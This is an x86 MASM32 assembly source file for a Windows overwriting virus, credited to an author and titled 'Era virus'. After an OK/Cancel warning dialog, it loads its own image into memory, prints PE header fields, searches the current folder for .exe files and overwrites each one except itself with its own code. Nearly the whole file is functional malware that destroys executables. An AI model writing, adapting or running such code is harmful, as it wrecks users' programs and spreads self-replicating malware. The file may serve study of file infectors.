.386
.model flat, stdcall
option casemap: none

; ==== for prototype structure and win32 function ====

include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\user32.inc
include c:\masm32\include\msvcrt.inc

printf proto c, datout:vararg
sprintf proto c, datout:vararg
strcmp proto c, var1:dword, var2:dword
scanfolder proto near c, path:dword
infect proto near c, shandle:dword

; ==== include library =====

includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\msvcrt.lib

; ==== data section start =====

.data

; for all messagebox
WarnTitle db "Era virus status:",0
WarnText db "Credit: Falsedeer@gamer.com.tw", 13, 10, "Please confirm execution!",0
AbortText db "Execution Aborted!",0

; for all strings
TmpVirusDir db "c:\ProgramData\%d",0 ; tmp virus base location
Str_emagic db "[#] e_magic(Dos_Header): %s", 10, 0
Str_eifanew db "[#] e_ifanew value(Dos_Header): %x", 10, 0
Str_Signature db "[#] Signature(NT_Header): %s", 10, 0
Str_Machine db "[#] Machine(File_Header): %x", 10, 0
Str_Magic db "[#] Magic(Optional_Header): %x", 10, 0
Str_ImageBase db "[#] ImageBase(Optional_Header): %x", 10, 0
Str_EntryPoint db "[#] AddressOfEnteyPoint(Optional_Header): %x", 10, 0
Str_foundfile db "[#] Found File: %s", 10, 0
Str_infectfile db "[#] Infecting File: %s", 10, 0
Str_handlefile db "[#] Opening %s with handle: %x", 10, 0
Str_infected db "[#] Overwrite Traget Complete !", 10, 0
Str_crlf db " ", 10, 0
TargetName db "*.exe",0
DirName db "*",0
Slash db "\",0

; for all buffer
TmpVirusPath db 200 dup(0) ; tmp vir path holder
VirusPathBuffer db 200 dup(0) ; name of current virus
CurrentDirBuffer db 200 dup(0) ; name of current directory

TargetPathBuffer db 200 dup(0)
SubdirPathBuffer db 200 dup(0)

; for all var
ImageBase dd 0
TmpVirusHandle dd 0
VirSize dd 0
BufferLocation dd 0 ; for holding virus code
FileSearchHandle dd 0
FileOpenHandle dd 0

DTA WIN32_FIND_DATA <>

; for debug message
Success db "Success!",0
Fail db "Error!",0

; ==== code section start =====

.code

; ==== scanfolder function ====

scanfolder PROC near c, path:dword

find_first:
	invoke FindFirstFileA, path, addr DTA
	cmp eax, INVALID_HANDLE_VALUE
	jz exit ; check if any match, else check if there's any subfolder in current
	mov [FileSearchHandle], eax
	invoke printf, addr Str_foundfile, addr DTA.cFileName
	
	; infect first found file
	invoke infect, addr DTA.cFileName

find_next:
	invoke FindNextFileA, [FileSearchHandle], addr DTA
	test eax, eax
	jz exit ; check if exit loop
	
	invoke printf, addr Str_foundfile, addr DTA.cFileName
	
	invoke infect, addr DTA.cFileName ; infect file
	jmp find_next ; loop
	
exit:
	invoke FindClose, [FileSearchHandle] ; close search handle
	ret
	
scanfolder ENDP

; ==== infect process function ====

infect PROC near c, filename:dword

get_abspath:
	invoke GetFullPathNameA, filename, 200, addr TargetPathBuffer, NULL
	test eax, eax
	jz exit ; exit if can't get absolute path
	
selfcheck: ; check if the target is itself.
	invoke strcmp, addr VirusPathBuffer, addr TargetPathBuffer
	test eax, eax
	jz avoid_self
	invoke printf, addr Str_infectfile, addr TargetPathBuffer ; print current target
	
open_target:
	invoke CreateFileA, addr TargetPathBuffer, FILE_ALL_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
	cmp eax, INVALID_HANDLE_VALUE ; exit if open error
	jz exit
	mov [FileOpenHandle], eax ; save file handle
	
	invoke printf, addr Str_handlefile, addr TargetPathBuffer, eax

overwrite:
	invoke WriteFile, [FileOpenHandle], [BufferLocation], [VirSize], NULL, NULL
	test eax, eax
	jz exit
	invoke printf, addr Str_infected
	invoke printf, addr Str_crlf
	
	invoke CloseHandle, [FileOpenHandle] ; close
	jmp exit

avoid_self:
	invoke printf, addr Str_crlf
	ret
	
exit:
	ret

infect ENDP

; ==== main code start ====

init:
	; virus start warning!
	
	invoke MessageBox, NULL, addr WarnText, addr WarnTitle, MB_OKCANCEL + MB_ICONWARNING
	
	cmp eax, 2 ; ID_CANCEL = 2
	jz abort
	
prep:
	; setup before execution
	
	; Get the base address(handle) for the current process(virus)
	invoke GetModuleHandleA, NULL
	mov [ImageBase], eax

	; Get name(path) of the executed virus
	invoke GetModuleFileNameA, NULL, addr VirusPathBuffer, 200
	
	invoke GetTickCount
	invoke sprintf, addr TmpVirusPath, addr TmpVirusDir, eax ; combine location base and current time as tmp virus's path
	
	invoke CopyFileA, addr VirusPathBuffer, addr TmpVirusPath, 0 ; create a copy of virus
	
	invoke CreateFileA, addr TmpVirusPath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ; open the copied virus, and receive a handle on eax.
	
	cmp eax, INVALID_HANDLE_VALUE
	jz error ; check if createfilea failed.
	mov [TmpVirusHandle], eax ; save filehandle

load: 
	; load the virus file to memory
	
	invoke GetFileSize, [TmpVirusHandle], NULL ; get size
	test eax, eax ; check if filesize is zero
	jz error
	mov [VirSize], eax ; save file size
	
	invoke VirtualAlloc, NULL, [VirSize], MEM_COMMIT, PAGE_EXECUTE_READWRITE
	mov [BufferLocation], eax ; reserve space for reading virus file
	
	invoke ReadFile, [TmpVirusHandle], [BufferLocation], [VirSize], NULL, NULL
	test eax, eax
	jz error
	
	invoke CloseHandle, [TmpVirusHandle]
	invoke DeleteFile, addr TmpVirusPath
	test eax, eax
	jz error
	
showinfo:
	; get some information from the virus file
	
	mov ebx, [ImageBase]
	
	; print e_magic
	invoke printf, addr Str_emagic, ebx
	
	add ebx, 3ch ; reach ifanew label
	xor eax, eax
	mov eax, [ebx] ; ifanew value
	push eax ; save ifanew value
	
	; print e_ifanew value
	invoke printf, addr Str_eifanew, eax
	
	pop eax ; mov ifanew to eax
	mov ebx, [ImageBase]
	add ebx, eax ; reach NT_Header
	
	; print file signature
	invoke printf, addr Str_Signature, ebx
	
	push ebx ; bakup NT_Header in stack
	add ebx, 4h ; reach File_Header
	mov eax, [ebx]
	xor ebx, ebx
	mov bx, ax
	
	; print Machine
	invoke printf, addr Str_Machine, ebx
	
	pop ebx ; restore ebx to NT_Header
	add ebx, 18h ; reach Optional_Header
	xor ecx, ecx
	mov eax, [ebx]
	mov cx, ax
	
	; print Magic
	invoke printf, addr Str_Magic, ecx
	
	push ebx ; bakup OP_Header
	add ebx, 10h ; reach EntryPoint label
	xor eax, eax
	mov eax, [ebx]
	
	; print EntryPoint
	invoke printf, addr Str_EntryPoint, eax
	
	pop ebx ; restore to OP_Header
	add ebx, 1ch ; reach ImageBase
	xor eax, eax
	mov eax, [ebx]
	
	; print ImageBase
	invoke printf, addr Str_ImageBase, eax
	invoke printf, addr Str_crlf
	xor eax, eax
	xor ebx, ebx

searchroutine:
	invoke scanfolder, addr TargetName
	
; ==== for debug and ending execution ====

success:
	; for debug
	
	invoke MessageBox, NULL, addr Success, addr Success, MB_OK
	jmp done
	
error:
	; for debug
	
	invoke MessageBox, NULL, addr Fail, addr Fail, MB_OK
	jmp done
	
abort:
	; execution abort message
	
	invoke MessageBox, NULL, addr AbortText, addr WarnTitle, MB_OK
	
done:
	; exit program
	
	invoke ExitProcess, 0
	
; ==== marking the start ====

end init
